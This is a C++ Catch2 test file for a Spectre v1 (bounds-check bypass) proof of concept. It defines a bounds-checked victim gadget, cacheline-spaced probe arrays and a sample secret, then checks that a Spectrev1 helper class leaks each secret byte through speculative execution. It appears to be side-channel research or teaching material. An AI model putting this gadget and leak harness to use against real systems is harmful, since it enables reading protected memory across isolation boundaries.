//
// Created by sage on 1/14/21.
//

#include <catch2/catch.hpp>
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>

unsigned int array1_size = 16;
uint8_t unused[64]; // seperate by a cacheline
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64]; // seperate by a cacheline
uint8_t array2[MAX_BYTE*64];
// If the bytes of secret are less than 16, then we will have trouble reading it
// because these are legitimate values of array1
uint8_t secret[25] = {0xde, 0xad, 0xbe, 0xef, 0x69};

volatile uint8_t get_elem(size_t x)
{
    // Make this volatile or compiler might optimize out
    volatile uint8_t res;
    if (x < array1_size )
    {
        res = array2[array1[x]*64];
    }
    return res;
}

TEST_CASE("Spectrev1", "[branch]")
{
    Spectrev1 s(array1,
                array2,
                [](volatile size_t x){flush(&array1_size); get_elem(x);},
                [](size_t _t){return _t%array1_size;},
                64,
                MAX_TRIES/8,
                20
    );

    uint8_t val;
    for (size_t i = 0; i < 5; ++i)
    {
        s.read_byte(&secret[i], &val);
        REQUIRE(val == secret[i]);
        printf("0x%02X\n", val);
    }

}